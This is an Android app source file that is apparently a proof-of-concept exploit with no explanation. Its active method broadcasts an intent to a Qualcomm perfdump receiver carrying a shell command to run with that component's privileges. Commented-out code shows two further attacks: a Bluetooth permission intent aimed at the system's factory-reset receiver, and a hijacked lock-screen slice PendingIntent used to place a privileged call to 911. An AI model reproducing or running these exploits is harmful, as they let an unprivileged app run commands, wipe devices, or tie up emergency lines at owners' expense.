package com.xxx.xxxx;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.app.PendingIntent;
import android.app.slice.Slice;
import android.app.slice.SliceSpec;
import android.bluetooth.BluetoothDevice;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcelable;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    public long xx = 0;
    public static final String ACTION_CONNECTION_ACCESS_REQUEST =
            "android.bluetooth.device.action.CONNECTION_ACCESS_REQUEST";
    final static String uriKeyguardSlices = "content://com.android.systemui.keyguard";
    public static final String EXTRA_ACCESS_REQUEST_TYPE =
            "android.bluetooth.device.extra.ACCESS_REQUEST_TYPE";

    /** @hide */
    public static final int REQUEST_TYPE_PROFILE_CONNECTION = 1;

    /** @hide */
    public static final int REQUEST_TYPE_PHONEBOOK_ACCESS = 2;

    /** @hide */
    public static final int REQUEST_TYPE_MESSAGE_ACCESS = 3;

    /** @hide */
    public static final int REQUEST_TYPE_SIM_ACCESS = 4;

    /**
     * Used as an extra field in {@link #ACTION_CONNECTION_ACCESS_REQUEST} intents,
     * Contains package name to return reply intent to.
     *
     * @hide
     */
    public static final String EXTRA_PACKAGE_NAME = "android.bluetooth.device.extra.PACKAGE_NAME";

    /**
     * Used as an extra field in {@link #ACTION_CONNECTION_ACCESS_REQUEST} intents,
     * Contains class name to return reply intent to.
     *
     * @hide
     */
    public static final String EXTRA_CLASS_NAME = "android.bluetooth.device.extra.CLASS_NAME";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button button = findViewById(R.id.button);
        button.setOnClickListener(view -> go());

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true){
                    try {
                            Thread.sleep(1000);
                        Log.d("----------------------"," xx "+xx++);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }

    @RequiresApi(api = Build.VERSION_CODES.P)
    private void go() {
//        try {
//            BluetoothDevice device = BluetoothDevice.class
//                    .getDeclaredConstructor(String.class)
//                    .newInstance("00:01:02:03:04:05");
//
//            Intent intent = new Intent();
//
//            intent.setClassName("com.android.settings",
//                    "com.android.settings.bluetooth.BluetoothPermissionActivity");
//            intent.setAction(ACTION_CONNECTION_ACCESS_REQUEST);
//            intent.putExtra(BluetoothDevice.EXTRA_DEVICE, device);
//            intent.putExtra(EXTRA_ACCESS_REQUEST_TYPE, REQUEST_TYPE_MESSAGE_ACCESS);
//            intent.putExtra(EXTRA_PACKAGE_NAME, "android");
//            intent.putExtra(EXTRA_CLASS_NAME, "com.android.server.MasterClearReceiver");
//            intent.setComponent(null);
//            startActivity(intent);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
        Intent intent = new Intent("android.perfdump.action.EXT_EXEC_SHELL");
        intent.setClassName("com.qualcomm.qti.perfdump", "com.qualcomm.qti.perfdump.StaticReceiver");
        intent.putExtra("callerPackageName", "com.xxx.xxxx");
        String xx = "mkdir /sdcard/aaaa";
        System.out.println(xx);
        intent.putExtra("shellCommand",xx);
        sendBroadcast(intent);

//        Bundle responseBundle = getContentResolver().call(Uri.parse(uriKeyguardSlices), "bind_slice", null, prepareReqBundle());


//        try {
//            Slice slice = responseBundle.getParcelable("slice");
//            PendingIntent pi = slice.getItems().get(0).getSlice().getItems().get(3).getSlice().getItems().get(1).getAction();
//            Intent evilIntent = new Intent("android.intent.action.CALL_PRIVILEGED");
//            evilIntent.setData(Uri.parse("tel:911"));
//            pi.send(getApplicationContext(), 0, evilIntent, null, null);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }

    }
    private Bundle prepareReqBundle() {
        Bundle b = new Bundle();
        b.putParcelable("slice_uri", Uri.parse(uriKeyguardSlices));
        ArrayList<Parcelable> supportedSpecs = new ArrayList<Parcelable>();
        supportedSpecs.add(new SliceSpec("androidx.app.slice.LIST", 1));
        supportedSpecs.add(new SliceSpec("androidx.slice.LIST", 1));
        supportedSpecs.add(new SliceSpec("androidx.app.slice.BASIC", 1));
        b.putParcelableArrayList("supported_specs", supportedSpecs);
        return b;
    }
}